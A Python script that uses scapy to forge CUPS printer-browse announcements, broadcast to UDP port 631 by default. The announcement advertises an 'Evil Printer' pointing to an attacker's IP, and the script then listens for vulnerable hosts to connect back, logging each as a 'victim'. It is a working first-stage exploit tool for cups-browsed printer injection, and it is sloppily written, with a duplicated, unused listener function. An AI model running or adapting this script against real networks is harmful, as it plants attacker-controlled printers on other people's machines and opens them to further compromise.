import argparse
import logging
import time
from scapy.all import IP, UDP, Raw, send, AsyncSniffer, wrpcap

def setup_logging(verbose):
    logging.basicConfig(
        level=logging.DEBUG if verbose else logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%H:%M:%S",
    )

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="255.255.255.255")
    parser.add_argument("--target-port", default=631)
    parser.add_argument("--adv-ip", required=True)
    parser.add_argument("--adv-port", default="8631", type=int)
    parser.add_argument("--queue", default="testprinter")
    parser.add_argument("-v", "--verbose", action="store_true")
    parser.add_argument("--iface", default=None)
    parser.add_argument("--pcap", default=None)
    parser.add_argument("--listen-timeout", default=5, type=int)
    parser.add_argument("--state", default=3, type=int)
    parser.add_argument("--printer-type", default="0x1000002")
    parser.add_argument("--no-listen", action="store_true")
    return parser.parse_args()

def build_uri(scheme, adv_ip, adv_port, queue):
    return "%s://%s:%d/printers/%s" % (scheme, adv_ip, adv_port, queue)
def build_browse_payload(ptype, state, uri, location, info, make_model):
    return '%s %d %s "%s" "%s" "%s"' % (ptype, state, uri, location, info, make_model)

def craft_packet(target, target_port, payload, src_port):
    return IP(dst=target) / UDP(sport=src_port, dport=target_port) / Raw(load=payload.encode())
def make_listener_socket(bind_ip, bind_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((bind_ip, bind_port))
    s.listen(5)
    return s

def wait_for_callback(s, timeout):
    s.settimeout(timeout)
    try:
        conn, addr = s.accept()
        logging.warning(">>> VICTIM CONNECTED BACK from %s:%d", addr[0], addr[1])
        data = conn.recv(4096)
        logging.info(data.split(b"\r\n")[0].decode("latin-1", "replace"))
        conn.close()
    except socket.timeout:
        logging.info("No callback within %ds — patched / unreachable?", timeout)
    finally:
        s.close()

import socket

def start_listener(bind_ip, bind_port, timeout):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((bind_ip, bind_port))
    s.listen(5)              # backlog: a small constant, not time
    s.settimeout(timeout)    # seconds to wait for the callback
    try:
        conn, addr = s.accept()
        logging.warning(">>> VICTIM CONNECTED BACK from %s:%d", addr[0], addr[1])
        data = conn.recv(4096)
        first = data.split(b"\r\n")[0].decode("latin-1", "replace")     
        logging.info(first)
        conn.close()
    except socket.timeout:
        logging.info("No callback within %ds — patched / unreachable?", timeout)
    finally:
        s.close()

if __name__ == "__main__":
    args = parse_arguments()
    setup_logging(args.verbose)
    logging.info("Target: %s", args.target)
    logging.info("Advertising: %s:%d  queue=%s", args.adv_ip, args.adv_port, args.queue)

    sock = None
    if not args.no_listen:
        sock = make_listener_socket("0.0.0.0", args.adv_port)

    # sniffer: only if --pcap  (independent of listener)
    sniffer = None
    if args.pcap is not None:
        bpf = "udp port %d or tcp port %d" % (args.target_port, args.adv_port)
        sniffer = AsyncSniffer(filter=bpf, iface=args.iface)
        sniffer.start()
        time.sleep(0.3)

    uri = build_uri("http", args.adv_ip, args.adv_port, args.queue)
    payload = build_browse_payload(args.printer_type, args.state, uri, "lab", "Evil Printer", "Generic PostScript")
    packet = craft_packet(args.target, args.target_port, payload, args.adv_port)
    send(packet)
    logging.info("Sent announcement to %s:%d", args.target, args.target_port)

    # wait for callback: only if we have a listener
    if sock is not None:
        wait_for_callback(sock, args.listen_timeout)

    # write pcap: only if we sniffed
    if sniffer is not None:
        sniffer.stop()
        wrpcap(args.pcap, sniffer.results)